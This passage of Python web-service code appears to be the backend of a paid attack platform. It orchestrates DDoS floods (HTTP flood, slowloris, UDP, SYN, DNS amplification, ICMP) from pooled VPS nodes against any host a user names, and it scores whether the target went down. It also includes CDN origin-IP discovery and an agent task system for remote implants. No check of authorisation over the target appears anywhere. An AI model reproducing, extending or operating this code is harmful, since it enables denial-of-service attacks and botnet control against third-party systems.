    _ssh_tests[pool_id] = {
        'type': 'pool',
        'nodes': nodes,
        'started_at': datetime.utcnow().isoformat(),
        'thread': threading.Thread(target=lambda: None),  # dummy for TTL cleanup compat
    }
    _ssh_tests[pool_id]['thread'].start()

    return {
        "pool_id": pool_id,
        "status": "started",
        "vps_count": len(nodes),
        "nodes": [{"vps_host": n['vps_host'], "status": n['result']['status']} for n in nodes],
    }


@app.get("/api/ddos/pool/status/{pool_id}")
async def get_pool_status(pool_id: str, current_user: User = Depends(get_current_user)):
    """Retorna status agregado + por-VPS de um ataque em pool."""
    if pool_id not in _ssh_tests:
        return {"status": "not_found"}
    entry = _ssh_tests[pool_id]
    if entry.get('type') != 'pool':
        return {"status": "not_found"}

    nodes_status = []
    total_requests = 0; total_errors = 0; any_running = False

    for node in entry['nodes']:
        res = node['result']
        alive = node['thread'].is_alive()
        if alive:
            any_running = True
        status = "running" if alive else res.get('status', 'completed')
        total_requests += res.get('requests', 0)
        total_errors   += res.get('errors', 0)
        nodes_status.append({
            "vps_host":    node['vps_host'],
            "status":      status,
            "requests":    res.get('requests', 0),
            "errors":      res.get('errors', 0),
            "vps_pid":     res.get('vps_pid'),
            "output":      (res.get('output', '') or '')[-200:],
        })

    return {
        "pool_id": pool_id,
        "status":           "running" if any_running else "completed",
        "total_requests":   total_requests,
        "total_errors":     total_errors,
        "started_at":       entry['started_at'],
        "nodes":            nodes_status,
    }


@app.post("/api/ddos/pool/stop/{pool_id}")
async def stop_pool(pool_id: str, current_user: User = Depends(get_current_user)):
    """Para todos os VPS de um pool."""
    if pool_id not in _ssh_tests or _ssh_tests[pool_id].get('type') != 'pool':
        raise HTTPException(status_code=404, detail="Pool não encontrado")

    killed = []
    for node in _ssh_tests[pool_id]['nodes']:
        res = node['result']
        executor = node['executor']
        vps_pid = res.get('vps_pid')
        if executor and vps_pid:
            await asyncio.to_thread(executor.kill_test, vps_pid)
            killed.append(node['vps_host'])
        res['status'] = 'stopped'

    return {"message": f"Pool parado. VPS encerrados: {', '.join(killed) or 'nenhum (PID pendente)'}"}


# ── Serverless Recon ─────────────────────────────────────────────────────────

@app.post("/api/recon/serverless")
async def serverless_recon(req: ServerlessReconRequest, current_user: User = Depends(get_current_user)):
    domain = req.domain.strip().lower().removeprefix("http://").removeprefix("https://").split("/")[0].split("?")[0]
    _operation_logs.append({
        "module": "Recon", "action": "Serverless Recon",
        "details": domain, "timestamp": datetime.utcnow().isoformat(),
    })
    try:
        result = await asyncio.to_thread(find_serverless_endpoints, domain, req.use_ssl)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Erro no serverless recon: {e}")
    return result


# ── Recon ────────────────────────────────────────────────────────────────────

@app.post("/api/recon/resolve")
async def resolve_domain(req: ReconResolveRequest, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    domain = req.get_domain()
    if not domain:
        raise HTTPException(status_code=422, detail="Campo 'domain' ou 'host' obrigatório")
    try:
        result = resolver_dominio(domain)
        _operation_logs.append({"module": "Recon", "action": "DNS resolve", "details": domain, "timestamp": datetime.utcnow().isoformat()})
        _audit(db, "Recon", "DNS Resolve", domain, current_user.id)
        return {
            "domain": domain,
            "host": result.get("host"),
            "ips": result.get("ips", []),
            "erro": result.get("erro"),
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/recon/scan")
async def scan_ports(req: ReconScanRequest, current_user: User = Depends(get_current_user)):
    try:
        portas = parse_portas(req.ports)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))

    _cleanup_old_scan_tasks()

    task_id = f"scan_{int(time.time()*1000)}_{os.urandom(4).hex()}"
    q: _queue.Queue = _queue.Queue()
    _scan_tasks[task_id] = {"q": q, "done": False, "results": None, "error": None, "completed_at": 0.0}

    def _run():
        try:
            def progress_cb(done, total):
                q.put({"progress": done, "total": total})
            results = scan_portas(req.host, portas, timeout=req.timeout, workers=req.workers,
                                  progress_cb=progress_cb)
            _scan_tasks[task_id]["results"] = results
            q.put({"done": True, "results": results, "host": req.host})
        except Exception as e:
            _scan_tasks[task_id]["error"] = str(e)
            q.put({"done": True, "error": str(e), "results": []})
        finally:
            _scan_tasks[task_id]["done"] = True
            _scan_tasks[task_id]["completed_at"] = time.time()
            _operation_logs.append({"module": "Recon", "action": "Port scan",
                                     "details": f"{req.host} ({req.ports})",
                                     "timestamp": datetime.utcnow().isoformat()})

    threading.Thread(target=_run, daemon=True).start()
    db_scan = SessionLocal()
    try:
        _audit(db_scan, "Recon", "Port Scan iniciado", f"{req.host} portas {req.ports}", current_user.id)
    finally:
        db_scan.close()
    return {"task_id": task_id, "total": len(portas)}


@app.get("/api/recon/scan/stream/{task_id}")
async def scan_stream(task_id: str, current_user: User = Depends(get_current_user)):
    if task_id not in _scan_tasks:
        raise HTTPException(status_code=404, detail="Task não encontrada")

    task = _scan_tasks[task_id]
    q: _queue.Queue = task["q"]

    async def _generate():
        import time as _time
        deadline = _time.monotonic() + 3600  # hard limit: 1h
        while _time.monotonic() < deadline:
            try:
                msg = q.get_nowait()
            except _queue.Empty:
                if task.get("done"):  # task concluída + fila vazia → encerra
                    break
                await asyncio.sleep(0.15)
                continue
            yield f"data: {json.dumps(msg)}\n\n"
            if msg.get("done"):
                break

    return StreamingResponse(
        _generate(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
        },
    )


@app.post("/api/recon/ipinfo")
async def ip_info(req: ReconIPInfoRequest, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    target_ip = req.get_ip()
    if not target_ip:
        raise HTTPException(status_code=422, detail="Campo 'ip' ou 'host' obrigatório")
    def _fetch():
        r = _requests.get(
            f"http://ip-api.com/json/{target_ip}",
            params={"fields": "status,message,country,countryCode,regionName,city,isp,org,as,lat,lon,query"},
            timeout=10,
        )
        r.raise_for_status()
        return r.json()
    try:
        data = await asyncio.get_event_loop().run_in_executor(None, _fetch)
    except Exception as e:
        raise HTTPException(status_code=502, detail=f"Erro ao consultar IP: {e}")
    if data.get("status") != "success":
        raise HTTPException(status_code=404, detail=data.get("message", "IP não encontrado ou inválido"))
    _operation_logs.append({"module": "Recon", "action": "IP Info", "details": target_ip, "timestamp": datetime.utcnow().isoformat()})
    _audit(db, "Recon", "IP Info", target_ip, current_user.id)
    return data


@app.post("/api/recon/cdn-check")
async def cdn_check(req: CDNCheckRequest, current_user: User = Depends(get_current_user)):
    """Detecta CDN e tenta descobrir o IP real de origem do servidor."""
    domain = req.domain.strip().lower().removeprefix("http://").removeprefix("https://").split("/")[0].split("?")[0]
    _operation_logs.append({
        "module": "Recon", "action": "CDN Check",
        "details": domain, "timestamp": datetime.utcnow().isoformat(),
    })
    try:
        result = await asyncio.to_thread(find_origin_ip, domain)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Erro na análise CDN: {e}")
    return result


@app.post("/api/recon/cloudfail")
async def start_cloudfail(req: CloudFailRequest, current_user: User = Depends(get_current_user)):
    _cf.cleanup_old_jobs()
    domain = req.domain.strip().lower().removeprefix("http://").removeprefix("https://").split("/")[0].split("?")[0]
    # strip www. para escanear o domínio raiz (www.exemplo.com → exemplo.com)
    if domain.startswith("www."):
        domain = domain[4:]
    if not domain or "." not in domain:
        raise HTTPException(status_code=400, detail="Domínio inválido")
    job_id = f"cf_{int(time.time() * 1000)}_{os.urandom(3).hex()}"
    wordlist = _cf.WORDLIST
    _cf.start_job(job_id, domain, wordlist, workers=min(req.workers, 50))
    _operation_logs.append({"module": "Recon", "action": "CloudFail", "details": domain, "timestamp": datetime.utcnow().isoformat()})
    return {"job_id": job_id, "domain": domain, "total": len(wordlist)}


@app.get("/api/recon/cloudfail/{job_id}")
async def get_cloudfail_status(job_id: str, current_user: User = Depends(get_current_user)):
    job = _cf.get_job(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job não encontrado")
    exposed = [f for f in job["found"] if f["exposed"]]
    return {
        "job_id": job_id,
        "status": job["status"],
        "domain": job["domain"],
        "domain_info": job["domain_info"],
        "progress": job["progress"],
        "total": job["total"],
        "found_count": len(exposed),
        "found": exposed,
        "all_found": job["found"],
        "error": job["error"],
    }


# ── Admin ────────────────────────────────────────────────────────────────────

@app.get("/api/admin/stats")
async def admin_stats(admin: User = Depends(require_admin), db: Session = Depends(get_db)):
    total_users = db.query(func.count(User.id)).scalar() or 0
    active_users = db.query(func.count(User.id)).filter(User.status == "active").scalar() or 0
    total_credits = db.query(func.sum(User.credits)).scalar() or 0
    first_of_month = datetime.utcnow().replace(day=1, hour=0, minute=0, second=0, microsecond=0)
    new_this_month = db.query(func.count(User.id)).filter(User.created_at >= first_of_month).scalar() or 0
    return {
        "total_users": total_users,
        "active_users": active_users,
        "total_credits": int(total_credits),
        "new_this_month": new_this_month,
    }

@app.get("/api/admin/users")
async def admin_list_users(admin: User = Depends(require_admin), db: Session = Depends(get_db)):
    users = db.query(User).order_by(User.created_at.desc()).all()
    return {"users": [
        {
            "id": u.id,
            "username": u.username,
            "email": u.email,
            "is_admin": u.is_admin or False,
            "credits": u.credits or 0,
            "status": u.status or "active",
            "created_at": u.created_at.isoformat(),
        }
        for u in users
    ]}

@app.post("/api/admin/users")
async def admin_create_user(req: AdminCreateUserRequest, admin: User = Depends(require_admin), db: Session = Depends(get_db)):
    if db.query(User).filter(User.username == req.username).first():
        raise HTTPException(status_code=400, detail="Username já existe")
    if db.query(User).filter(User.email == req.email).first():
        raise HTTPException(status_code=400, detail="Email já existe")
    user = User(
        username=req.username,
        email=req.email,
        password_hash=hash_password(req.password),
        is_admin=req.is_admin,
        credits=req.credits,
        status="active",
    )
    db.add(user)
    db.commit()
    db.refresh(user)
    _operation_logs.append({"module": "ADMIN", "action": "Usuário criado", "details": req.username, "timestamp": datetime.utcnow().isoformat()})
    return {"id": user.id, "message": "Usuário criado com sucesso"}

@app.put("/api/admin/users/{user_id}")
async def admin_update_user(
    user_id: str, req: AdminUpdateUserRequest,
    admin: User = Depends(require_admin), db: Session = Depends(get_db)
):
    user = db.query(User).filter(User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    if req.username is not None:
        existing = db.query(User).filter(User.username == req.username, User.id != user_id).first()
        if existing:
            raise HTTPException(status_code=400, detail="Username já está em uso")
        user.username = req.username
    if req.email is not None:
        existing = db.query(User).filter(User.email == req.email, User.id != user_id).first()
        if existing:
            raise HTTPException(status_code=400, detail="Email já está em uso")
        user.email = req.email
    if req.password:
        user.password_hash = hash_password(req.password)
    if req.is_admin is not None:
        user.is_admin = req.is_admin
    if req.status is not None:
        user.status = req.status
    db.commit()
    _operation_logs.append({"module": "ADMIN", "action": "Usuário atualizado", "details": user.username, "timestamp": datetime.utcnow().isoformat()})
    return {"message": "Usuário atualizado com sucesso"}

@app.post("/api/admin/users/{user_id}/credits")
async def admin_update_credits(
    user_id: str, req: AdminCreditsRequest,
    admin: User = Depends(require_admin), db: Session = Depends(get_db)
):
    user = db.query(User).filter(User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    current = user.credits or 0
    if req.action == "add":
        user.credits = current + req.amount
    elif req.action == "remove":
        user.credits = max(0, current - req.amount)
    elif req.action == "set":
        user.credits = max(0, req.amount)
    else:
        raise HTTPException(status_code=400, detail="Ação inválida. Use: add, remove, set")
    db.commit()
    _operation_logs.append({"module": "ADMIN", "action": f"Créditos {req.action}", "details": f"{user.username}: {user.credits}", "timestamp": datetime.utcnow().isoformat()})
    return {"message": "Créditos atualizados", "credits": user.credits}

@app.delete("/api/admin/users/{user_id}")
async def admin_delete_user(
    user_id: str,
    admin: User = Depends(require_admin), db: Session = Depends(get_db)
):
    if user_id == admin.id:
        raise HTTPException(status_code=400, detail="Nao e possivel deletar o proprio usuario")
    user = db.query(User).filter(User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    username = user.username
    db.delete(user)
    db.commit()
    _operation_logs.append({"module": "ADMIN", "action": "Usuário deletado", "details": username, "timestamp": datetime.utcnow().isoformat()})
    return {"message": f"Usuário '{username}' deletado"}


# ── Campaign (módulo de automação completa) ───────────────────────────────────

class CampaignRequest(BaseModel):
    target_host: str
    target_port: Optional[int] = None  # None = auto-scan de portas
    methods: List[str] = ["http_flood", "slowloris", "udp_flood"]
    duration_per_method: int = 30
    threads: int = 8
    pps: int = 200
    run_recon: bool = True

_campaign_store: dict = {}  # campaign_id -> campaign state dict

COMMON_WEB_PORTS = [
    21, 22, 25, 53, 80, 443, 3000, 3001, 4000, 5000,
    8000, 8001, 8008, 8080, 8081, 8082, 8443, 8888,
    9000, 9001, 9090, 9443, 10000,
]

def _scan_ports(host: str, ports: list, timeout: float = 1.5) -> list:
    resolved = _socket.gethostbyname(host)
    open_ports = []
    lock = threading.Lock()

    def check(port):
        try:
            s = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
            s.settimeout(timeout)
            if s.connect_ex((resolved, port)) == 0:
                with lock:
                    open_ports.append(port)
            s.close()
        except Exception:
            pass

    threads = [threading.Thread(target=check, args=(p,), daemon=True) for p in ports]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=timeout + 1.0)
    return sorted(open_ports)

def _probe_latency(host: str, port: int, timeout: float = 4.0) -> dict:
    """Faz uma requisição HTTP simples e retorna latência e status."""
    t0 = time.time()
    try:
        r = _requests.get(f"http://{host}:{port}/", timeout=timeout, allow_redirects=False)
        return {"ms": int((time.time() - t0) * 1000), "code": r.status_code, "ok": True}
    except _requests.exceptions.Timeout:
        return {"ms": int(timeout * 1000), "code": 0, "ok": False, "reason": "timeout"}
    except Exception as e:
        return {"ms": int((time.time() - t0) * 1000), "code": 0, "ok": False, "reason": str(e)[:60]}

def _effectiveness_label(score: int) -> str:
    if score >= 80: return "Servidor derrubado"
    if score >= 50: return "Servico degradado"
    if score >= 25: return "Impacto moderado"
    return "Servidor resistiu"

def _recommendations(results: list, recon: dict) -> list:
    recs = []
    for r in results:
        m = r["method"]
        eff = r["effectiveness"]
        if m == "slowloris" and eff >= 50:
            recs.append("Implante limite de conexoes simultaneas por IP (ex: nginx limit_conn). O Slowloris explorou conexoes abertas sem rate limit.")
        if m == "http_flood" and eff >= 50:
            recs.append("Ative rate limiting por IP (ex: nginx limit_req 20r/s). O HTTP Flood saturou o servidor sem restricao de requisicoes.")
        if m == "udp_flood" and eff >= 25:
            recs.append("Configure firewall para bloquear UDP flood no perimetro (iptables -A INPUT -p udp --dport X -m limit --limit 100/s -j ACCEPT).")
        if m == "syn_flood" and eff >= 25:
            recs.append("Habilite SYN Cookies no kernel (net.ipv4.tcp_syncookies=1) para mitigar SYN Flood sem descartar conexoes legitimas.")
        if m == "dns_amplification" and eff >= 25:
            recs.append("Desative recursao aberta no servidor DNS e utilize Response Rate Limiting (DNS RRL) para mitigar amplificacao.")
    if not recs:
        recs.append("Servidor demonstrou boa resiliencia. Continue monitorando com ferramentas de observabilidade (Grafana, Prometheus).")
    server = recon.get("server_header", "")
    if server and "Apache" in server:
        recs.append("Servidor Apache detectado: ative mod_reqtimeout e mod_evasive para mitigar Slowloris e HTTP Flood nativamente.")
    if server and "nginx" in server.lower():
        recs.append("Servidor nginx detectado: use worker_processes auto e ajuste worker_connections para melhor distribuicao de carga sob ataque.")
    return recs

def _run_campaign(campaign_id: str, req: CampaignRequest, user_id: str = ""):
    state = _campaign_store[campaign_id]
    state["status"] = "running"
    results = []
    effective_port = req.target_port  # determinado durante recon quando None

    try:
        # ── Fase 0: Recon ────────────────────────────────────────────────────
        recon_data = {"host": req.target_host}

        # Resolve IP sempre
        try:
            resolved = _socket.gethostbyname(req.target_host)
            recon_data["resolved_ip"] = resolved
        except Exception:
            recon_data["resolved_ip"] = req.target_host

        # Port scan automático se porta não especificada
        if req.target_port is None:
            state["phase"] = "recon"
            state["phase_label"] = f"Escaneando {len(COMMON_WEB_PORTS)} portas..."
            state["recon"] = recon_data
            open_ports = _scan_ports(req.target_host, COMMON_WEB_PORTS)
            recon_data["open_ports"] = open_ports
            state["recon"] = recon_data

            if not open_ports:
                state["status"] = "error"
                state["error"] = f"Nenhuma porta aberta encontrada ({len(COMMON_WEB_PORTS)} portas escaneadas)"
                return

            WEB_PRIORITY = [80, 443, 8080, 8443, 3000, 8000, 5000, 3001, 4000,
                            8001, 8008, 8081, 8082, 8888, 9000, 9001, 9090, 9443, 10000]
            effective_port = next((p for p in WEB_PRIORITY if p in open_ports), open_ports[0])
            recon_data["port"] = effective_port
            state["target"] = f"{req.target_host}:{effective_port}"
        else:
            effective_port = req.target_port
            recon_data["port"] = effective_port

        if req.run_recon:
            state["phase"] = "recon"
            state["phase_label"] = f"Analisando porta {effective_port}..."

            probes = [_probe_latency(req.target_host, effective_port) for _ in range(3)]
            ok_probes = [p for p in probes if p["ok"]]
            baseline = int(sum(p["ms"] for p in ok_probes) / len(ok_probes)) if ok_probes else 9999

            try:
                resp = _requests.get(f"http://{req.target_host}:{effective_port}/", timeout=5, allow_redirects=False)
                recon_data["server_header"] = resp.headers.get("Server", "n/d")
                recon_data["status_code"] = resp.status_code
                recon_data["has_csp"] = bool(resp.headers.get("Content-Security-Policy", ""))
                recon_data["has_hsts"] = bool(resp.headers.get("Strict-Transport-Security", ""))
                recon_data["has_ratelimit"] = bool(resp.headers.get("X-RateLimit-Limit") or resp.headers.get("Retry-After"))
            except Exception:
                recon_data["server_header"] = "n/d"

            recon_data["baseline_ms"] = baseline
        else:
            probes = [_probe_latency(req.target_host, effective_port) for _ in range(2)]
            ok_probes = [p for p in probes if p["ok"]]
            baseline = int(sum(p["ms"] for p in ok_probes) / len(ok_probes)) if ok_probes else 9999
            recon_data["baseline_ms"] = baseline

        state["recon"] = recon_data

        # ── Fases de ataque ──────────────────────────────────────────────────
        for idx, method in enumerate(req.methods):
            state["phase"] = f"attack_{idx}"
            state["phase_label"] = f"Executando {method.replace('_', ' ').title()} ({idx+1}/{len(req.methods)})"
            state["current_method"] = method

            executor = LocalFloodExecutor()
            thread, result_ref = executor.start_test(
                target_host=req.target_host,
                target_port=effective_port,
                method=method,
                duration=req.duration_per_method,
                pps=req.pps,
                threads=req.threads,
            )

            probes_during = []
            elapsed = 0
            while elapsed < req.duration_per_method:
                time.sleep(2)
                elapsed += 2
                p = _probe_latency(req.target_host, effective_port, timeout=5.0)
                p["elapsed"] = elapsed
                probes_during.append(p)
                state["live_probe"] = p

            thread.join(timeout=5)
            final_metrics = result_ref

            failed   = [p for p in probes_during if not p["ok"] or p["code"] in (429, 503, 504)]
            ok_d     = [p for p in probes_during if p["ok"] and p["code"] not in (429, 503, 504)]
            avg_lat  = int(sum(p["ms"] for p in ok_d) / len(ok_d)) if ok_d else int(req.duration_per_method * 1000)
            peak_lat = max((p["ms"] for p in probes_during), default=0)
            latency_inc = ((avg_lat - baseline) / max(baseline, 1)) * 100 if baseline < 9000 else 0
            fail_pct    = (len(failed) / max(len(probes_during), 1)) * 100
            effectiveness = min(100, int(fail_pct * 0.6 + min(latency_inc, 100) * 0.4))

            result = {
                "method":          method,
                "method_label":    method.replace("_", " ").title(),
                "port":            effective_port,
                "requests_sent":   final_metrics.get("requests") or final_metrics.get("packets") or 0,
                "errors":          final_metrics.get("errors", 0),
                "baseline_ms":     recon_data["baseline_ms"],
                "avg_latency_ms":  avg_lat,
                "peak_latency_ms": peak_lat,
                "fail_pct":        round(fail_pct, 1),
                "latency_inc_pct": round(latency_inc, 1),
                "effectiveness":   effectiveness,
                "verdict":         _effectiveness_label(effectiveness),
                "probes":          len(probes_during),
            }
            results.append(result)
            state["results"] = results[:]

        # ── Relatório ────────────────────────────────────────────────────────
        state["phase"] = "report"
        state["phase_label"] = "Gerando relatorio"
        best = max(results, key=lambda r: r["effectiveness"]) if results else None
        state["report"] = {
            "target":          state["target"],
            "total_methods":   len(results),
            "total_duration":  len(results) * req.duration_per_method,
            "recon":           state.get("recon", {}),
            "results":         results,
            "best_method":     best["method"] if best else None,
            "best_label":      best["method_label"] if best else None,
            "best_eff":        best["effectiveness"] if best else 0,
            "recommendations": _recommendations(results, state.get("recon", {})),
            "finished_at":     datetime.utcnow().isoformat(),
        }
        state["status"] = "done"
        state["phase_label"] = "Campanha concluida"

    except Exception as e:
        state["status"] = "error"
        state["error"] = str(e)

    _operation_logs.append({
        "module": "Campaign",
        "action": "Campanha automatica",
        "details": f"{req.target_host}:{effective_port} — {len(req.methods)} metodos",
        "timestamp": datetime.utcnow().isoformat(),
    })

    # Persist final campaign state to DB
    if user_id:
        db_c = SessionLocal()
        try:
            db_camp = db_c.query(Campaign).filter(Campaign.id == campaign_id).first()
            if db_camp:
                db_camp.status = state["status"]
                db_camp.results = {
                    "recon": state.get("recon", {}),
                    "methods_results": state.get("results", []),
                    "phase": state.get("phase", ""),
                    "error": state.get("error", ""),
                }
                db_camp.report = state.get("report") or {}
                db_camp.completed_at = datetime.utcnow()
                db_c.commit()
        except Exception:
            pass
        finally:
            db_c.close()

@app.post("/api/campaign/start")
async def campaign_start(req: CampaignRequest, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    valid_methods = {"http_flood", "slowloris", "udp_flood", "syn_flood", "dns_amplification", "icmp_flood"}
    bad = [m for m in req.methods if m not in valid_methods]
    if bad:
        raise HTTPException(status_code=400, detail=f"Metodos invalidos: {bad}")
    if not req.methods:
        raise HTTPException(status_code=400, detail="Selecione ao menos um metodo")
    if req.duration_per_method < 10 or req.duration_per_method > 120:
        raise HTTPException(status_code=400, detail="Duracao por metodo: 10-120s")
    if req.target_port is not None and not (1 <= req.target_port <= 65535):
        raise HTTPException(status_code=400, detail="Porta invalida (1-65535)")

    try:
        resolved = await asyncio.to_thread(_socket.gethostbyname, req.target_host)
    except _socket.gaierror:
        raise HTTPException(status_code=400, detail=f"Host nao encontrado: {req.target_host}")

    campaign_id = f"camp_{int(time.time() * 1000)}_{os.urandom(3).hex()}"
    initial_target = f"{req.target_host}:{req.target_port}" if req.target_port else req.target_host
    started_at = datetime.utcnow()

    _campaign_store[campaign_id] = {
        "id":          campaign_id,
        "status":      "starting",
        "phase":       "init",
        "phase_label": "Iniciando campanha",
        "target":      initial_target,
        "methods":     req.methods,
        "results":     [],
        "recon":       {},
        "report":      None,
        "live_probe":  None,
        "user_id":     current_user.id,
        "started_at":  started_at.isoformat(),
    }

    # Persist to DB so campaigns survive restarts
    db_camp = Campaign(
        id=campaign_id,
        user_id=current_user.id,
        status="starting",
        config={
            "target_host": req.target_host,
            "target_port": req.target_port,
            "methods": req.methods,
            "duration_per_method": req.duration_per_method,
            "threads": req.threads,
            "pps": req.pps,
            "run_recon": req.run_recon,
        },
        results={},
        report={},
        started_at=started_at,
    )
    db.add(db_camp)
    db.commit()
    _audit(db, "Campaign", "Campanha iniciada", f"{initial_target} — {len(req.methods)} metodos", current_user.id)

    threading.Thread(target=_run_campaign, args=(campaign_id, req, current_user.id), daemon=True).start()
    return {"campaign_id": campaign_id, "status": "starting", "methods": req.methods}

@app.get("/api/campaign/status/{campaign_id}")
async def campaign_status(campaign_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    # Live data from memory (running campaigns)
    c = _campaign_store.get(campaign_id)
    if c:
        return c
    # Historical data from DB
    db_camp = db.query(Campaign).filter(
        Campaign.id == campaign_id, Campaign.user_id == current_user.id
    ).first()
    if not db_camp:
        raise HTTPException(status_code=404, detail="Campanha nao encontrada")
    cfg = db_camp.config or {}
    return {
        "id": db_camp.id,
        "status": db_camp.status,
        "phase": "done" if db_camp.status in ("done", "error") else "unknown",
        "phase_label": "Campanha concluida" if db_camp.status == "done" else db_camp.status,
        "target": cfg.get("target_host", ""),
        "methods": cfg.get("methods", []),
        "results": (db_camp.results or {}).get("methods_results", []),
        "recon": (db_camp.results or {}).get("recon", {}),
        "report": db_camp.report or {},
        "live_probe": None,
        "started_at": db_camp.started_at.isoformat() if db_camp.started_at else None,
        "completed_at": db_camp.completed_at.isoformat() if db_camp.completed_at else None,
    }

@app.get("/api/campaign/list")
async def campaign_list(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    # Merge in-memory (live) campaigns with DB (historical) campaigns
    in_memory_ids = set(_campaign_store.keys())
    live = [
        {"id": v["id"], "target": v["target"], "status": v["status"],
         "started_at": v["started_at"], "methods": v["methods"], "source": "live"}
        for v in _campaign_store.values()
        if v.get("user_id") == current_user.id
    ]
    db_camps = db.query(Campaign).filter(Campaign.user_id == current_user.id).order_by(Campaign.started_at.desc()).all()
    historical = [
        {"id": c.id,
         "target": (c.config or {}).get("target_host", ""),
         "status": c.status,
         "started_at": c.started_at.isoformat() if c.started_at else None,
         "methods": (c.config or {}).get("methods", []),
         "completed_at": c.completed_at.isoformat() if c.completed_at else None,
         "source": "db"}
        for c in db_camps if c.id not in in_memory_ids
    ]
    return {"campaigns": live + historical}

@app.delete("/api/campaign/{campaign_id}")
async def campaign_delete(campaign_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    removed = False
    if campaign_id in _campaign_store:
        del _campaign_store[campaign_id]
        removed = True
    db_camp = db.query(Campaign).filter(
        Campaign.id == campaign_id, Campaign.user_id == current_user.id
    ).first()
    if db_camp:
        db.delete(db_camp)
        db.commit()
        removed = True
    if not removed:
        raise HTTPException(status_code=404, detail="Campanha nao encontrada")
    return {"message": "Campanha removida"}


# ── Agent System ─────────────────────────────────────────────────────────────

class AgentRegisterRequest(BaseModel):
    user_id: str
    hostname: str
    ip: str = ""
    os_info: str = ""
    username: str = ""
    python_version: str = ""

class AgentExecuteRequest(BaseModel):
    techniques: List[str]

class AgentTaskResultRequest(BaseModel):
    result: dict

class AgentBatchResultRequest(BaseModel):
    results: List[dict]

def _validate_agent_token(agent_id: str, token: str, db: Session) -> PenteiaAgent:
    """Validate agent token — if no token stored yet (legacy), accept and set it."""
    agent = db.query(PenteiaAgent).filter(PenteiaAgent.id == agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agente não encontrado")
    if agent.agent_token and agent.agent_token != token:
        raise HTTPException(status_code=401, detail="Token de agente inválido")
    if not agent.agent_token and token:
        agent.agent_token = token
        db.commit()
    return agent


@app.post("/api/agents/register")
async def agent_register(req: AgentRegisterRequest, db: Session = Depends(get_db)):
    user = db.query(User).filter(User.id == req.user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    import uuid as _uuid_mod
    agent_token = str(_uuid_mod.uuid4()).replace("-", "")
    agent = PenteiaAgent(
        user_id=req.user_id,
        hostname=req.hostname,
        ip=req.ip,
        os_info=req.os_info,
        username=req.username,
        python_version=req.python_version,
        agent_token=agent_token,
        last_seen=datetime.utcnow(),
        status="active",
    )
    db.add(agent)
    db.commit()
    db.refresh(agent)
    return {"agent_id": agent.id, "agent_token": agent_token, "message": "Agente registrado com sucesso"}

@app.get("/api/agents")
async def agents_list(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    agents = db.query(PenteiaAgent).filter(PenteiaAgent.user_id == current_user.id).order_by(PenteiaAgent.last_seen.desc()).all()
    now = datetime.utcnow()
    result = []
    for a in agents:
        delta = (now - a.last_seen).total_seconds()
        status = "active" if delta < 60 else ("idle" if delta < 300 else "lost")
        result.append({
            "id": a.id, "hostname": a.hostname, "ip": a.ip,
            "os_info": a.os_info, "username": a.username,
            "python_version": a.python_version,
            "last_seen": a.last_seen.isoformat(),
            "last_seen_secs": int(delta),
            "status": status,
            "created_at": a.created_at.isoformat(),
        })
    return {"agents": result}

@app.post("/api/agents/{agent_id}/execute")
async def agent_execute(
    agent_id: str,
    req: AgentExecuteRequest,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    agent = db.query(PenteiaAgent).filter(
        PenteiaAgent.id == agent_id,
        PenteiaAgent.user_id == current_user.id,
    ).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agente não encontrado")
    tasks = []
    for tech in req.techniques:
        t = AgentTask(agent_id=agent_id, technique=tech, status="pending")
        db.add(t)
        tasks.append(t)
    db.commit()
    return {"queued": len(tasks), "task_ids": [t.id for t in tasks]}

@app.get("/api/agents/{agent_id}/tasks")
async def agent_get_tasks(agent_id: str, x_agent_token: Optional[str] = Header(None), db: Session = Depends(get_db)):
    agent = _validate_agent_token(agent_id, x_agent_token or "", db)
    tasks = db.query(AgentTask).filter(
        AgentTask.agent_id == agent_id,
        AgentTask.status == "pending",
    ).all()
    for t in tasks:
        t.status = "running"
    db.commit()
    return {
        "tasks": [{"id": t.id, "technique": t.technique} for t in tasks]
    }

@app.post("/api/agents/tasks/{task_id}/result")
async def agent_task_result(task_id: str, req: AgentTaskResultRequest, x_agent_token: Optional[str] = Header(None), db: Session = Depends(get_db)):
    task = db.query(AgentTask).filter(AgentTask.id == task_id).first()
    if not task:
        raise HTTPException(status_code=404, detail="Task não encontrada")
    _validate_agent_token(task.agent_id, x_agent_token or "", db)
    task.result = req.result
    task.status = "completed"
    task.completed_at = datetime.utcnow()
    db.commit()
    return {"message": "Resultado salvo"}

@app.post("/api/agents/{agent_id}/heartbeat")
async def agent_heartbeat(agent_id: str, x_agent_token: Optional[str] = Header(None), db: Session = Depends(get_db)):
    agent = _validate_agent_token(agent_id, x_agent_token or "", db)
    agent.last_seen = datetime.utcnow()
    agent.status = "active"
    db.commit()
    return {"message": "ok"}

@app.post("/api/agents/{agent_id}/batch-result")
async def agent_batch_result(
    agent_id: str,
    req: AgentBatchResultRequest,
    x_agent_token: Optional[str] = Header(None),
    db: Session = Depends(get_db),
):
    agent = _validate_agent_token(agent_id, x_agent_token or "", db)
    agent.last_seen = datetime.utcnow()
    for r in req.results:
        tech = r.get("technique", "")
        if not tech:
            continue
        existing = db.query(AgentTask).filter(
